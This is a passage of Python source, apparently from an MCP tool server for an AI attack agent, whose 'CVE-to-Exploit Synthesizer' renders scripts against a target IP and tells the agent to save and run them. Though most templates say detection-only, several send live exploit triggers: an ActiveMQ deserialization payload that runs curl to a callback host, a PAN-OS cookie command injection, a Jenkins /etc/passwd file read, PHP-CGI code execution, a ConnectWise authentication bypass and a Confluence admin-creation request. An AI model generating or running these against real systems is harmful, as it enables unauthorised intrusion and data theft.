    def _render_bluekeep_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (BlueKeep / RDP) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# Connects to RDP and reports whether NLA is enforced. NLA-enabled RDP
# is NOT vulnerable to BlueKeep.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 3389

def probe():
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    # X.224 Connection Request (TPKT header + X.224 CR TPDU)
    cr = bytes.fromhex(
        "0300002b27e0000000000000"  # TPKT + X.224 CR
        "00000000"                  # cookie
        "434f4f4b4945"              # "COOKIE" placeholder
        "0d0a"                      # \r\n
    )
    s.sendall(cr)
    try:
        data = s.recv(1024)
        if data[:4] == b"\\x03\\x00\\x00\\x0b":
            print("[+] RDP responded with X.224 CC Ã¢â‚¬â€ service is listening.")
            print("    Check whether NLA is enforced (security mode 4 in MCS).")
        else:
            print(f"[-] Unexpected response: {{data[:20]!r}}")
    except socket.timeout:
        print("[-] No response Ã¢â‚¬â€ service may be filtered or unreachable.")
    s.close()

if __name__ == "__main__":
    print(f"[*] Probing {{TARGET}}:{{PORT}} for BlueKeep (CVE-2019-0708)")
    probe()
'''

    def _render_regresshion_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (regreSSHion / OpenSSH) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- banner-grabs the OpenSSH version and reports whether it
# falls in the vulnerable band (< 4.4p1 OR 8.5p1 <= v < 9.8p1). The real
# exploit is a heap-overflow race in sshd's SIGALRM handler (Qualys PoC:
# https://github.com/qualys/regresshion) -- out of scope for a generated script.
import socket, sys, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 22

def banner_grab():
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    data = s.recv(1024).decode(errors="replace")
    s.close()
    return data

def parse_version(banner: str):
    m = re.search(r"SSH-2\\.0-OpenSSH_(\\d+)\\.(\\d+)(?:p(\\d+))?", banner)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))

def vulnerable(v):
    if v is None:
        return False
    if v < (4, 4, 1):
        return True
    return (8, 5, 1) <= v < (9, 8, 1)

if __name__ == "__main__":
    banner = banner_grab()
    print(f"[*] Banner: {{banner.strip()}}")
    v = parse_version(banner)
    if vulnerable(v):
        print(f"COMPROMISE: regresshion_vulnerable target={{TARGET}} version={{v}}")
    else:
        print(f"VULN_NOT_CONFIRMED: OpenSSH {{v}} not in regreSSHion band")
'''

    def _render_xz_backdoor_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (xz-utils / liblzma backdoor) suspicion check for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# The xz backdoor (liblzma 5.6.0/5.6.1) is a BUILD-TIME supply-chain implant --
# there is NO on-wire signature. The only network-visible signal is an
# OpenSSH banner built against a backdoored liblzma on affected distros.
# This is a SUSPICION check, not a confirmed trigger.
import socket, sys, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 22

def banner_grab():
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    data = s.recv(1024).decode(errors="replace")
    s.close()
    return data

if __name__ == "__main__":
    banner = banner_grab()
    print(f"[*] Banner: {{banner.strip()}}")
    m = re.search(r"SSH-2\\.0-OpenSSH_(\\d+\\.\\d+p?\\d*)", banner)
    if m:
        print(f"COMPROMISE: xz_backdoor_suspected target={{TARGET}} openssh={{m.group(1)}}")
        print("    NOTE: suspicion only -- confirm by checking the sshd binary's liblzma linkage on the target")
    else:
        print("VULN_NOT_CONFIRMED: no OpenSSH banner")
'''

    def _render_activemq_rce_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Apache ActiveMQ OpenWire RCE) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- sends a malformed OpenWire ExceptionResponse frame that
# triggers deserialization of a ClassPathXmlApplicationContext URL. The
# detection variant points at a non-routable host; a real engagement replaces
# it with the operator's callback and watches for the outbound lookup.
import socket, sys, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 61616
CALLBACK_HOST = "example.invalid"  # replace with operator callback in real use

def openwire_frame(payload: bytes) -> bytes:
    # OpenWire: 4-byte length prefix + magic + command type + payload
    body = b"\\x01\\x00\\x00\\x00" + payload
    return struct.pack(">I", len(body)) + body

if __name__ == "__main__":
    # ExceptionResponse (type 0x1f) with a ClassPath XML URL -- the CVE-2023-46604
    # trigger. Detection: the target attempts to resolve CALLBACK_HOST.
    xml = f'<?xml version="1.0" encoding="UTF-8" ?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>curl</value><value>http://{{CALLBACK_HOST}}/poc</value></list></constructor-arg></bean></beans>'
    frame = openwire_frame(b"\\x1f" + xml.encode())
    s = socket.socket()
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.sendall(frame)
    try:
        resp = s.recv(4096)
        print(f"[*] Got {{len(resp)}} bytes -- check callback for outbound lookup")
        print(f"COMPROMISE: activemq_rce_triggered target={{TARGET}} (verify callback)")
    except socket.timeout:
        print("VULN_NOT_CONFIRMED: no response (service may be patched or filtered)")
    s.close()
'''

    def _render_confluence_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Atlassian Confluence broken access control) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- probes the bootstrap-bypass endpoint. The weaponized path
# (POST /setup/setupadministrator.action with username/password/fullName/email)
# is left as a comment for the agent to fill after operator confirmation.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 8090

def http_get(path: str) -> tuple[int, str]:
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    req = (
        f"GET {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    resp = s.recv(8192).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    # Unauthenticated bootstrap-status probe (CVE-2023-22515)
    status, body = http_get("/server-info?bootstrapStatusProvider.clusterState=PROPERLY_CONFIGURED")
    print(f"[*] /server-info -> {{status}}")
    if status == 200:
        print(f"COMPROMISE: confluence_bootstrap_exposed target={{TARGET}}")
        print("    WEAPONIZED: POST /setup/setupadministrator.action username=admin&password=<set>&fullName=admin&email=admin@invalid")
    else:
        print(f"VULN_NOT_CONFIRMED: /server-info returned {{status}}")
'''

    def _render_ivanti_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Ivanti Connect Secure command injection) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- probes the unauthenticated user-password endpoint that
# leaks user data on vulnerable builds (<=22.3R3.x). Patched builds return 403.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443

def https_get(path: str) -> tuple[int, str]:
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
    s.settimeout(8)
    s.connect((TARGET, PORT))
    req = (
        f"GET {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    resp = s.recv(16384).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    status, body = https_get("/api/v1/cav/user/password")
    print(f"[*] /api/v1/cav/user/password -> {{status}}")
    if status == 200 and ('"email"' in body or '"username"' in body):
        print(f"COMPROMISE: ivanti_user_data_leak target={{TARGET}}")
    else:
        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
'''

    def _render_panos_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Palo Alto PAN-OS GlobalProtect command injection) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- sends the crafted SESSID request. The command output is
# written to /var/log/pan/gp on the device; the agent must verify that
# side-channel externally (the template cannot read the device filesystem).
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443

def https_get(path: str, extra_headers: dict) -> tuple[int, str]:
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
    s.settimeout(8)
    s.connect((TARGET, PORT))
    hdrs = "".join(f"{{k}}: {{v}}\\r\\n" for k, v in extra_headers.items())
    req = (
        f"GET {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"{{hdrs}}"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    resp = s.recv(16384).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    # CVE-2024-3400: SESSID cookie with a command-injection payload; the
    # crafted request writes command output to /var/log/pan/gp on the device.
    status, body = https_get(
        "/global-protect/login.esp?cmd=test",
        {{"Sec-Cookie-X": "*", "Cookie": "SESSID=/../../../var/log/pan/gp;id"}},
    )
    print(f"[*] /global-protect/login.esp -> {{status}}")
    print(f"COMPROMISE: panos_cmd_injection_sent target={{TARGET}}")
    print("    NOTE: verify externally -- check /var/log/pan/gp on the device for command output")
'''

    def _render_citrix_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Citrix NetScaler ADC/Gateway) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- checks for the SAML token leakage signature on vulnerable
# builds (<=13.0-13.1 build <=92.19/<=64.35).
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443

def https_get(path: str) -> tuple[int, str]:
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
    s.settimeout(8)
    s.connect((TARGET, PORT))
    req = (
        f"GET {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    resp = s.recv(16384).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    status, body = https_get("/vpn/index.html")
    print(f"[*] /vpn/index.html -> {{status}}")
    if "SAMLResponse" in body or "NSC_AAAC" in body:
        print(f"COMPROMISE: citrix_saml_leak target={{TARGET}}")
    else:
        print(f"VULN_NOT_CONFIRMED: no SAML leakage signature (status {{status}})")
'''

    def _render_connectwise_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (ConnectWise ScreenConnect auth bypass) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- sends the Authentication header bypass and checks whether
# the redirect target is the dashboard (bypassed) vs the login page (patched).
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def http_post(path: str, body: str, extra_headers: dict) -> tuple[int, str]:
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    hdrs = "".join(f"{{k}}: {{v}}\\r\\n" for k, v in extra_headers.items())
    req = (
        f"POST {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
        f"Content-Length: {{len(body)}}\\r\\n"
        f"{{hdrs}}"
        f"\\r\\n"
    ).encode() + body.encode()
    s.sendall(req)
    resp = s.recv(16384).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    # CVE-2024-0204: Authentication header bypass on the login POST.
    status, body = http_post(
        "/Login.aspx",
        "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&userName=admin&password=anything",
        {{"Authentication": "admin"}},
    )
    print(f"[*] /Login.aspx -> {{status}}")
    if status == 302 and "HomePage.aspx" in body:
        print(f"COMPROMISE: connectwise_auth_bypass target={{TARGET}}")
    else:
        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
'''

    def _render_jenkins_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Jenkins arbitrary file read via CLI) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- sends the @-prefixed CLI argument that expands a file's
# contents into the error message (CVE-2024-23897, <=2.441).
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

if __name__ == "__main__":
    # Jenkins CLI protocol: length-prefixed UTF-8 args. The @/etc/passwd arg
    # makes the server expand the file into the error response.
    args = ["help", "@/etc/passwd"]
    payload = b"".join(
        len(a.encode()).to_bytes(4, "big") + a.encode() for a in args
    )
    s = socket.socket()
    s.settimeout(10)
    s.connect((TARGET, PORT))
    req = (
        f"POST /cli?remoting=false HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
        f"Content-Length: {{len(payload)}}\\r\\n"
        f"\\r\\n"
    ).encode() + payload
    s.sendall(req)
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    text = resp.decode(errors="replace")
    if "root:x:0:0:" in text or "daemon:x:1:1:" in text:
        print(f"COMPROMISE: jenkins_file_read target={{TARGET}}")
    else:
        print("VULN_NOT_CONFIRMED: no file contents in CLI response")
'''

    def _render_joomla_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Joomla unauthorized API access) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- probes the broken-auth config endpoint (CVE-2023-23752,
# Joomla 4.0.0-4.2.7) that leaks the application config without auth.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80

def http_get(path: str) -> tuple[int, str]:
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    req = (
        f"GET {{path}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    resp = s.recv(16384).decode(errors="replace")
    s.close()
    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
    return status, resp

if __name__ == "__main__":
    status, body = http_get("/api/index.php/v1/config/application?public=true")
    print(f"[*] /api/index.php/v1/config/application -> {{status}}")
    if status == 200 and '"public": true' in body:
        print(f"COMPROMISE: joomla_config_leak target={{TARGET}}")
    else:
        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
'''

    def _render_text4shell_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Apache Commons Text StringSubstitutor RCE) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- mirrors the Log4Shell template but swaps ${{jndi:}} for
# ${{date:}} (renders the current year without execution) to detect the
# StringSubstitutor sink without triggering code.
import socket, sys, datetime

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80

PAYLOAD = "${{date:YYYY}}"

def probe_http():
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    req = (
        f"GET /?q={{PAYLOAD}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"User-Agent: {{PAYLOAD}}\\r\\n"
        f"X-Api-Version: {{PAYLOAD}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    return s.recv(4096).decode(errors="replace")

if __name__ == "__main__":
    resp = probe_http()
    year = str(datetime.datetime.now().year)
    if year in resp:
        print(f"COMPROMISE: text4shell_vulnerable target={{TARGET}} ({{year}} reflected)")
    else:
        print("VULN_NOT_CONFIRMED: no date substitution reflected")
'''

    def _render_php_cgi_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (PHP CGI argument injection, Windows) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY -- sends the -d allow_url_include=1 -d auto_prepend_file=php://input
# query-string injection (CVE-2024-4577) with a benign echo body. A vulnerable
# Windows PHP-CGI target executes the body and reflects it.
import socket, sys, urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80

if __name__ == "__main__":
    qs = urllib.parse.quote("-d allow_url_include=1 -d auto_prepend_file=php://input")
    body = b"<?php echo 'NETATTACKAI_PHP_CGI_OK'; ?>"
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    req = (
        f"POST /index.php?{{qs}} HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
        f"Content-Length: {{len(body)}}\\r\\n"
        f"\\r\\n"
    ).encode() + body
    s.sendall(req)
    resp = s.recv(8192).decode(errors="replace")
    s.close()
    if "NETATTACKAI_PHP_CGI_OK" in resp:
        print(f"COMPROMISE: php_cgi_rce target={{TARGET}}")
    else:
        print("VULN_NOT_CONFIRMED: no PHP execution reflected")
'''

    def _render_http2_rapid_reset_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (HTTP/2 Rapid Reset) DETECTION-ONLY probe for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# NON-DESTRUCTIVE DETECTION ONLY: sends a SMALL number of HTTP/2 HEADERS +
# RST_STREAM pairs (not a flood) and reports whether the server stops
# responding. Do NOT weaponize this CVE -- it is DoS-class.
import socket, sys, struct, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
RESETS = 20  # small, non-destructive count

def h2_frame(ftype: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
    return struct.pack(">I", len(payload)) + bytes([ftype, flags]) + struct.pack(">I", stream_id) + payload

if __name__ == "__main__":
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    s.sendall(b"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n")  # H2 connection preface
    s.sendall(h2_frame(4, 0, 0, struct.pack(">I", 0)))  # SETTINGS
    for i in range(RESETS):
        sid = (i + 1) * 2
        s.sendall(h2_frame(1, 0x4, sid, b"\\x82"))  # HEADERS :method GET
        s.sendall(h2_frame(3, 0, sid))  # RST_STREAM
    try:
        data = s.recv(1024)
        if data:
            print(f"VULN_NOT_CONFIRMED: server still responsive after {{RESETS}} resets")
        else:
            print(f"COMPROMISE: http2_rapid_reset_detection target={{TARGET}} (server stalled)")
    except socket.timeout:
        print(f"COMPROMISE: http2_rapid_reset_detection target={{TARGET}} (server stalled)")
    s.close()
'''

    def _render_generic_probe(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} generic probe for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# Generic banner + HTTP probe. Refine the payload section for the
# specific CVE after consulting the CVE details above.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else {port}

def probe():
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    # Customise the probe body for the specific CVE/product.
    probe_body = b"GET / HTTP/1.0\\r\\nHost: " + TARGET.encode() + b"\\r\\n\\r\\n"
    s.sendall(probe_body)
    try:
        data = s.recv(4096)
        print(f"[*] {{len(data)}} bytes received.")
        print(data[:500].decode(errors="replace"))
    except socket.timeout:
        print("[-] Timeout Ã¢â‚¬â€ no response.")
    s.close()

if __name__ == "__main__":
    print(f"[*] Probing {{TARGET}}:{{PORT}} for {cve}")
    probe()
'''

    @mcp.tool()
    @require_allowlist()
    def cve_to_exploit_synth(target_ip: str, cve_id: str, service_name: str = "", version: str = "") -> str:
        """Generate a Python exploit script for a specific CVE against the target. Provide the CVE ID (e.g., CVE-2021-44228), service name, and version. The tool fetches CVE details and returns a ready-to-use exploit script. Use write_python_file to save it, then run_python_file to execute."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not cve_id or not cve_id.strip():
            return "BLOCKED: cve_id is required."
        # M8: validate the target IP before it is interpolated into the
        # generated exploit script.
        if not validate_target_or_ip(target_ip):
            return "BLOCKED: target_ip must be a valid IP address or domain."
        # M8: service_name/version are interpolated into generated Python
        # source comments -- reject obvious injection carriers (newlines,
        # quotes, backslashes) outright so a crafted value can't break out of
        # the f-string template into the generated script.
        for _field, _val in (("service_name", service_name), ("version", version)):
            if _val and re.search(r"[\n\r'\"\\]", _val):
                return f"BLOCKED: {_field} contains forbidden characters (newline/quote/backslash)."

        cve = cve_id.strip().upper()
        if not re.fullmatch(r"CVE-\d{4}-\d{4,}", cve):
            return "BLOCKED: invalid CVE ID format. Use CVE-YYYY-NNNNN."

        result_lines = [f"CVE_TO_EXPLOIT_SYNTH: {cve} for {target_ip}", ""]

        # Fetch CVE details
        try:
            entries = nvd.search_sync(cve)
            cve_info = format_cve_results(entries, cve)
            result_lines.append("--- CVE Details ---")
            result_lines.append(cve_info[:2000])
        except Exception as e:
            result_lines.append(f"CVE lookup warning: {e}")

        # Search for existing PoCs. Issue 3: use the VERIFIED cve_to_poc
        # resolver (GitHub Search API + searchsploit --cve + NVD refs, each
        # HTTP-existence-checked) instead of raw search_web_exploit, which fed
        # the model unverified URLs and led it to hallucinate+git_clone
        # non-existent repos. Fall back to web search only if cve_to_poc is
        # unavailable on this object.
        try:
            if hasattr(search, "cve_to_poc"):
                # NVD refs gathered above are already in `entries`; pass them
                # through so NVD-listed PoC refs get HTTP-verified too.
                _poc_refs: list[str] = []
                for _e in entries:
                    for _r in getattr(_e, "references", []) or []:
                        if isinstance(_r, str) and _r:
                            _poc_refs.append(_r)
                poc_results = search.cve_to_poc(cve, nvd_refs=_poc_refs)
            else:
                poc_results = search.search_web_exploit(f"{cve} exploit PoC python")
            result_lines.append("")
            result_lines.append("--- Verified PoC Sources ---")
            result_lines.append(poc_results[:1500])
        except Exception:
            pass

        # Generate exploit template Ã¢â‚¬â€ Phase 0.5: branch on CVE/product so
        # the synthesized script is meaningfully different per CVE, not
        # just a generic HTTP probe. This is intentionally conservative:
        # we emit a template that the LLM can refine rather than try to
        # be a complete exploit database.
        svc = service_name or "http"
        ver = version or "unknown"

        # Determine port/protocol hint from service name.
        port_hint = {
            "http": 80, "https": 443, "smb": 445, "rdp": 3389,
            "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306,
            "mssql": 1433, "ldap": 389, "rdp2": 3389, "rdp3": 3389,
            # Phase 4: new CVE-family service ports
            "activemq": 61616, "confluence": 8090, "ivanti": 443,
            "panos": 443, "citrix": 443, "connectwise": 80,
            "jenkins": 8080, "joomla": 80, "php_cgi": 80, "commons_text": 80,
        }.get(svc.lower(), 80)

        # CVE-family-specific template. Keep the surface small but
        # materially different from the generic fallback.
        cve_lower = cve.lower()
        _renderer = _render_generic_probe
        if "log4j" in cve_lower or "log4shell" in cve_lower or cve in ("cve-2021-44228", "cve-2021-45046"):
            _renderer = _render_log4j_exploit
        elif "eternalblue" in cve_lower or cve in ("cve-2017-0143", "cve-2017-0144", "cve-2017-0145", "cve-2017-0146"):
            _renderer = _render_eternalblue_template
        elif "smbghost" in cve_lower or cve == "cve-2020-0796":
            _renderer = _render_smbghost_template
        elif "bluekeep" in cve_lower or cve == "cve-2019-0708":
            _renderer = _render_bluekeep_template
        # Phase 4: new CVE-family templates (each matches by CVE ID and/or
        # service-name hint so the agent can invoke with either). Note: `cve`
        # is uppercase; compare against `cve_lower` for the exact-ID branches.
        elif cve_lower == "cve-2024-6387" or svc.lower() == "openssh":
            _renderer = _render_regresshion_template
        elif cve_lower == "cve-2024-3094" or "xz" in cve_lower:
            _renderer = _render_xz_backdoor_template
        elif cve_lower == "cve-2023-46604" or svc.lower() == "activemq":
            _renderer = _render_activemq_rce_template
        elif cve_lower == "cve-2023-22515" or svc.lower() == "confluence":
            _renderer = _render_confluence_template
        elif cve_lower in ("cve-2024-21887", "cve-2023-46805") or svc.lower() == "ivanti":
            _renderer = _render_ivanti_template
        elif cve_lower == "cve-2024-3400" or svc.lower() == "panos":
            _renderer = _render_panos_template
        elif cve_lower == "cve-2023-3519" or svc.lower() == "citrix":
            _renderer = _render_citrix_template
        elif cve_lower == "cve-2024-0204" or svc.lower() == "connectwise":
            _renderer = _render_connectwise_template
        elif cve_lower == "cve-2024-23897" or svc.lower() == "jenkins":
            _renderer = _render_jenkins_template
        elif cve_lower == "cve-2023-23752" or svc.lower() == "joomla":
            _renderer = _render_joomla_template
        elif cve_lower == "cve-2022-42889" or svc.lower() == "commons_text":
            _renderer = _render_text4shell_template
        elif cve_lower == "cve-2024-4577" or svc.lower() == "php_cgi":
            _renderer = _render_php_cgi_template
        elif cve_lower == "cve-2023-44487":
            _renderer = _render_http2_rapid_reset_template
        exploit_body = _renderer(target_ip, port_hint, svc, ver, cve)

        # Phase 4: log which dispatch branch fired so the agent can debug
        # "why did I get the generic probe for CVE-2024-6387".
        _dispatch_name = {
            _render_log4j_exploit: "log4j", _render_eternalblue_template: "eternalblue",
            _render_smbghost_template: "smbghost", _render_bluekeep_template: "bluekeep",
            _render_regresshion_template: "regresshion", _render_xz_backdoor_template: "xz_backdoor",
            _render_activemq_rce_template: "activemq", _render_confluence_template: "confluence",
            _render_ivanti_template: "ivanti", _render_panos_template: "panos",
            _render_citrix_template: "citrix", _render_connectwise_template: "connectwise",
            _render_jenkins_template: "jenkins", _render_joomla_template: "joomla",
            _render_text4shell_template: "text4shell", _render_php_cgi_template: "php_cgi",
            _render_http2_rapid_reset_template: "http2_rapid_reset",
        }.get(_renderer, "generic")
        result_lines.append(f"TEMPLATE_DISPATCHED: {_dispatch_name}")

        result_lines.append("")
        result_lines.append("--- Exploit Script Template ---")
        result_lines.append(exploit_body)

        # Self-healing PoC (Killer Feature #3): when ``poc_verification.enabled``
        # is true in config, syntax-check the synthesized template inline so
        # the agent sees the gate result before writing/running it. The agent
        # then asks the LLM to fix any syntax error and re-verify (loop is
        # driven by the agent calling ``verify_poc`` directly; this is the
        # first-pass inline check).
        try:
            from tools.poc_verifier import poc_verification_config, syntax_check
            pv_cfg = poc_verification_config(config)
            if pv_cfg["enabled"]:
                syn = syntax_check(exploit_body)
                result_lines.append("")
                result_lines.append("--- PoC Verification (syntax gate) ---")
                if syn.syntax_ok:
                    result_lines.append("SYNTAX_OK: true")
                    result_lines.append(
                        "INSTRUCTIONS: syntax verified. Use write_python_file to save, "
                        "then call verify_poc for the optional Docker compile/import gate, "
                        "then run_python_file."
                    )
                else:
                    result_lines.append("SYNTAX_OK: false")
                    result_lines.append(f"STDERR: {syn.stderr[:500]}")
                    result_lines.append(
                        "INSTRUCTIONS: the synthesized template has a syntax error. "
                        "Fix the reported error, then call verify_poc to re-check before "
                        "writing/running. Repeat up to max_retries."
                    )
        except Exception:
            # Verification is opt-in; never let it break the synth path.
            pass

        result_lines.append("")
        result_lines.append(
            "INSTRUCTIONS: Use write_python_file to save this script, "
            "review and tighten the payload for the specific CVE, then "
            "run with run_python_file."
        )

        return "\n".join(result_lines)

    @mcp.tool()
    @audit_tool
    def hash_crack_identify(hash_value: str) -> str:
